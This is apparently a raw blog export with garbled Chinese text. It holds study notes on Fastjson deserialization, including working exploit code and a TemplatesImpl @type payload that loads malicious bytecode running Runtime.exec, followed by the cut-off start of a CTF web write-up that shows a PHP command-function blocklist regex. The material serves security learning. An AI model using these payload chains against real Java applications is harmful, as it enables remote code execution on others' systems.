class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;MyJson.User\&quot;,\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;lihua\&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parseObject(json,User.class));<br>        System.out.println(JSON.parse(json));<br>        &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/fastjson5.png" alt="fastjson5"></p><p>åœ¨ä½¿ç”¨<code>JSON.parseObject</code>æ–¹æ³•çš„æ—¶å€™åªæœ‰åœ¨ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šæ˜¯å“ªä¸ªç±»æ‰ä¼šååºåˆ—åŒ–æˆåŠŸã€‚</p><p>ä¸Šé¢çš„jsonéƒ½å­˜åœ¨<code>type</code>å…³é”®å­—æŒ‡å®šç±»ï¼Œå¦‚æœæ²¡è¿™ä¸ª<code>type</code>çš„è¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">json2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;lihua\&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parseObject(json2, User.class));<br>        System.out.println(JSON.parseObject(json2));<br>        System.out.println(JSON.parse(json2));<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/fastjson6.png" alt="fastjson6"></p><p>æ‰€ä»¥é¢„æœŸçš„ååºåˆ—åŒ–è¯­å¥å†™æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:6,&quot;</span> +  <br>        <span class="hljs-string">&quot;\&quot;name\&quot;:\&quot;Drunkbaby\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  <br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonString, Student.class);<br></code></pre></td></tr></table></figure><p>è¦ç”¨ <code>parseObject</code>ï¼Œé‡Œé¢çš„å‚æ•°éœ€è¦æ˜¯ <code>Object.class</code>ã€‚</p><h3 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h3><ul><li>@type æŒ‡å®šç±»</li><li>ä½¿ç”¨<code>JSON.parse</code>æ–¹æ³•ååºåˆ—åŒ–ä¼šè°ƒç”¨æ­¤ç±»çš„setæ–¹æ³•</li><li>ä½¿ç”¨<code>JSON.parseObject</code>æ–¹æ³•ååºåˆ—åŒ–ä¼šè°ƒç”¨æ­¤ç±»ç‰¹å®šçš„getå’Œsetæ–¹æ³•</li><li>å¯ä»¥å†™ä¸€ä¸ªæ¶æ„ç±»ï¼Œç„¶åé€šè¿‡è¿™ä¸€ç‰¹æ€§å®ç°å‘½ä»¤æ‰§è¡Œ</li></ul><p>æ³¨æ„ä¸æ˜¯æ‰€æœ‰çš„<strong>setter&#x2F;getteræ–¹æ³•</strong>ï¼š</p><p>æ»¡è¶³æ¡ä»¶çš„setterï¼š</p><ul><li>éé™æ€å‡½æ•°</li><li>è¿”å›ç±»å‹ä¸ºvoidæˆ–å½“å‰ç±»</li><li>å‚æ•°ä¸ªæ•°ä¸º1ä¸ª</li></ul><p>æ»¡è¶³æ¡ä»¶çš„getterï¼š</p><ul><li>éé™æ€æ–¹æ³•</li><li>æ— å‚æ•°</li><li><strong>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollectionæˆ–Mapæˆ–AtomicBooleanæˆ–AtomicIntegeræˆ–AtomicLong</strong></li></ul><p>ä¸€èˆ¬çš„ï¼ŒFastjsonååºåˆ—åŒ–æ¼æ´çš„PoCå†™æ³•å¦‚ä¸‹ï¼Œ@typeæŒ‡å®šäº†ååºåˆ—åŒ–å¾—åˆ°çš„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br><span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;xxx.xxx.xxx&quot;</span>,<br><span class="hljs-string">&quot;xxx&quot;</span>:<span class="hljs-string">&quot;xxx&quot;</span>,<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>å…³é”®æ˜¯è¦æ‰¾å‡ºä¸€ä¸ªç‰¹æ®Šçš„åœ¨ç›®æ ‡ç¯å¢ƒä¸­å·²å­˜åœ¨çš„ç±»ï¼Œæ»¡è¶³å¦‚ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ol><li>è¯¥ç±»çš„æ„é€ å‡½æ•°ã€<code>setter</code>æ–¹æ³•ã€<code>getter</code>æ–¹æ³•ä¸­çš„æŸä¸€ä¸ªå­˜åœ¨å±é™©æ“ä½œï¼Œæ¯”å¦‚é€ æˆå‘½ä»¤æ‰§è¡Œï¼›</li><li>å¯ä»¥æ§åˆ¶è¯¥æ¼æ´å‡½æ•°çš„å˜é‡ï¼ˆä¸€èˆ¬å°±æ˜¯è¯¥ç±»çš„å±æ€§ï¼‰ï¼›</li></ol><h3 id="åˆ©ç”¨ç¤ºä¾‹"><a href="#åˆ©ç”¨ç¤ºä¾‹" class="headerlink" title="åˆ©ç”¨ç¤ºä¾‹"></a>åˆ©ç”¨ç¤ºä¾‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//User.java</span><br>eption;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ— å‚æ„é€ &quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> id)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æœ‰å‚æ„é€ &quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, id=&quot;</span> + id +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.print(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span>  &#123;<br>        System.out.println(<span class="hljs-string">&quot;getId&quot;</span>);<br>        <span class="hljs-keyword">return</span> id;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;setId&quot;</span>);<br>        <span class="hljs-built_in">this</span>.id = id;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>EXP.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> MyJson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP1</span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;MyJson.User\&quot;,\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;lihua\&quot;&#125;&quot;</span>;<br>            System.out.println(JSON.parseObject(json,User.class));<br>        &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/fastjson7.png" alt="fastjson7"></p><p>è¿™é‡Œå¦‚æœæŠŠ<code>setId</code>æ–¹æ³•å¢åŠ ä¸€ä¸ªå‚æ•°&#x2F;ä¿®æ”¹è¿”å›å€¼ç±»å‹ä¸º<code>int</code>éƒ½æ— æ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>æˆ‘ä»¬çš„ PoC æ˜¯æŠŠæ¶æ„ä»£ç æ”¾åˆ°ä¸€ä¸ª json æ ¼å¼çš„å­—ç¬¦ä¸²é‡Œé¢ï¼Œå¼€å¤´æ˜¯è¦æ¥ <code>@type</code> çš„ã€‚è¿™é‡Œå…¶å®èµ‹å€¼å°±ä»£è¡¨æˆ‘ä»¬ä¸éœ€è¦é€šè¿‡åå°„æ¥ä¿®æ”¹å€¼ï¼Œè€Œæ˜¯å¯ä»¥ç›´æ¥èµ‹å€¼ã€‚</p><p><code>@type</code> ä¹‹åæ˜¯æˆ‘ä»¬è¦å»è¿›è¡Œååºåˆ—åŒ–çš„ç±»ï¼Œä¼šè·å–å®ƒçš„æ„é€ å‡½æ•°ã€getter ä¸ setter æ–¹æ³•ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆæ˜¯è¦æ‰¾è¿™ä¸ªååºåˆ—åŒ–ç±»çš„æ„é€ å‡½æ•°ã€ getterï¼Œsetter æ–¹æ³•æœ‰é—®é¢˜çš„åœ°æ–¹ã€‚</p><h3 id="å’ŒåŸç”Ÿååºåˆ—åŒ–ç›¸åŒå’Œä¸åŒçš„ç‚¹ï¼š"><a href="#å’ŒåŸç”Ÿååºåˆ—åŒ–ç›¸åŒå’Œä¸åŒçš„ç‚¹ï¼š" class="headerlink" title="å’ŒåŸç”Ÿååºåˆ—åŒ–ç›¸åŒå’Œä¸åŒçš„ç‚¹ï¼š"></a>å’ŒåŸç”Ÿååºåˆ—åŒ–ç›¸åŒå’Œä¸åŒçš„ç‚¹ï¼š</h3><ul><li>ä¸éœ€è¦å®ç°<code>Serializable</code></li><li>å˜é‡å¯ä»¥æ˜¯<code>transient</code>ï¼Œä½†å˜é‡å¾—æœ‰å¯¹åº”çš„<code>setter</code>æˆ–è€…æ˜¯<code>public</code>&#x2F;æ»¡è¶³æ¡ä»¶çš„<code>getter</code></li><li>åŸç”Ÿçš„å…¥å£ç‚¹å¾—æ˜¯<code>readObject</code>ï¼Œ<code>fastJson</code>æ˜¯<code>setter</code>&#x2F;<code>getter</code></li><li>æœ€åæ‰§è¡Œç‚¹éƒ½å¾—é€šè¿‡åå°„æˆ–è€…åŠ¨æ€ç±»åŠ è½½</li></ul><h3 id="åŸºäº-TemplatesImpl-çš„åˆ©ç”¨é“¾"><a href="#åŸºäº-TemplatesImpl-çš„åˆ©ç”¨é“¾" class="headerlink" title="åŸºäº TemplatesImpl çš„åˆ©ç”¨é“¾"></a>åŸºäº TemplatesImpl çš„åˆ©ç”¨é“¾</h3><p>CC3 é“¾åˆ©ç”¨<code>TemplatesImpl</code> åŠ è½½å­—èŠ‚ç è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ¼æ´çš„ç»ˆç‚¹åœ¨äºè°ƒç”¨äº† <code>.newInstance()</code> æ–¹æ³•ã€‚å›çœ‹ä¼šå‘ç°æ¼æ´ç‚¹çš„åœ°æ–¹å®é™…ä¸Šæ˜¯ä¸€ä¸ª <code>getter</code> æ–¹æ³•ï¼š</p><p><img src="/img/TemplatesImplGetter.png" alt="TemplatesImplGetter"></p><p>æ‰€ä»¥å¯<code>TemplatesImpl</code> ä¸­çš„è¿™ä¸ª<code>getter</code>æ˜¯æ»¡è¶³åˆ©ç”¨æ¡ä»¶çš„ã€‚åœ¨æ„é€  EXP ä¹‹å‰ï¼Œå…ˆåˆ†æä¸€ä¸‹å‚æ•°:</p><ul><li>å…ˆçœ‹ TemplatesImpl ç±»ä¸­çš„ <code>getTransletInstance()</code> æ–¹æ³•ã€‚è¿™é‡Œå¯ä»¥ç›´æ¥å‚è€ƒ CC3é“¾å­çš„æ„é€ ã€‚<img src="/img/getTransletInstance.png" alt="getTransletInstance"></li></ul><p><code>_name</code> ä¸å¯ä»¥ä¸º nullï¼Œéœ€è¦ <code>_class</code> ä¸º nullï¼Œè¿™æ ·è¿›å…¥åˆ° <code>defineTransletClasses</code> è¿™ä¸ªæ–¹æ³•é‡Œé¢ã€‚æ‰€ä»¥ <code>_class</code> å¯ä»¥ä¸ç”¨å†™ï¼Œæˆ–è€…å†™ä¸º nullã€‚<code>_tfactory</code> ä¹Ÿä¸èƒ½ä¸º nullï¼Œ<code>_bytecodes</code> æ˜¯æ¶æ„å­—èŠ‚ç ã€‚å…·ä½“å¯ä»¥å‚è€ƒCC3 çš„åˆ†ææ–‡ç« ã€‚ç°åœ¨å½¢æˆçš„<code>payload</code>ä¸ºï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json">final String NASTY_CLASS = <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br><br>final String evilClassPath = <span class="hljs-string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>;<br><br><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string"></span><br><span class="hljs-string"> \&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="hljs-string">&quot;\&quot;,</span><br><span class="hljs-string"> \&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],</span><br><span class="hljs-string"> &#x27;_name&#x27;:&#x27;Drunkbaby&#x27;,</span><br><span class="hljs-string"> &#x27;_tfactory&#x27;:&#123; &#125;,</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>ä¸»è¦ç›®æ ‡å°±æ˜¯è°ƒç”¨è¿™ä¸ª<code>getter</code>æ–¹æ³•ï¼Œä½†æ³¨æ„è¿™ä¸ªæ–¹æ³•å¹¶ä¸æ»¡è¶³ç¬¬ä¸‰ä¸ªåˆ©ç”¨æ¡ä»¶ï¼š</p><p><strong>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollectionæˆ–Mapæˆ–AtomicBooleanæˆ–AtomicIntegeræˆ–AtomicLong</strong></p><p>æ‰€ä»¥è¦ç»§ç»­å¯»æ‰¾å…¶å®ƒ<code>getter/setter</code>æ–¹æ³•ï¼Œæ‰¾è°è°ƒç”¨äº† <code>getTransletInstance()</code>ï¼š<code>newTransformer()</code> æ–¹æ³•è°ƒç”¨äº† <code>getTransletInstance()</code> æ–¹æ³•</p><p><img src="/img/fastjson9.png" alt="fastjson9"></p><p> <code>getOutputProperties()</code> è°ƒç”¨äº† <code>newTransformer()</code>ï¼š</p><p><img src="/img/fastjson11.png" alt="fastjson11"></p><p>çœ‹ä¸‹è¿™ä¸ª<code>getOutputProperties()</code>æ–¹æ³•çš„è¿”å›å€¼ï¼š</p><p><img src="/img/fastjson8.png" alt="fastjson8"></p><p><code>Properties</code> å³ç»§æ‰¿è‡ª <code>Hashtable</code>ï¼Œè¿™ä¸œè¥¿æ˜¯<code>Map</code>ç±»å‹çš„ï¼Œç¬¦åˆè¦æ±‚ã€‚</p><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">getOutputProperties</span>()  ---&gt; <span class="hljs-built_in">newTransformer</span>() ---&gt; <span class="hljs-built_in">TransformerImpl</span>(getTransletInstance(), _outputProperties,  <br> _indentNumber, _tfactory);<br></code></pre></td></tr></table></figure><p>é¦–å…ˆåˆ›å»º<code>Clac.class</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Clac</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Clac</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            var1.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> MyJson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><span class="hljs-keyword">import</span> org.apache.commons.io.IOUtils;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><br><span class="hljs-comment">// TemplatesImpl é“¾å­çš„ EXP</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LastEXP</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>        IOUtils.copy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(cls)), bos);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> Base64.encodeBase64String(bos.toByteArray());<br>        &#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ParserConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParserConfig</span>();<br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">fileSeparator</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;file.separator&quot;</span>);<br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:\\Clac.class&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">text1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>        <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;Drunkbaby&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span>;<br>        System.out.println(text1);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);<br>        <span class="hljs-comment">//Object obj = JSON.parse(text1, Feature.SupportNonPublicField);</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>        &#125;<br>        &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3>]]></content>
    
    
    
    <tags>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>H&amp;NCTF2024_éƒ¨åˆ†web</title>
    <link href="/2024/04/27/hnctf/"/>
    <url>/2024/04/27/hnctf/</url>
    
    <content type="html"><![CDATA[<p>ä¸€éƒ¨åˆ†web</p><span id="more"></span><h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;moran&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>];<br>        <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="hljs-variable">$str1</span>) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str2</span>) != <span class="hljs-number">19</span> || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="hljs-variable">$str2</span>))&#123;<br>            <span 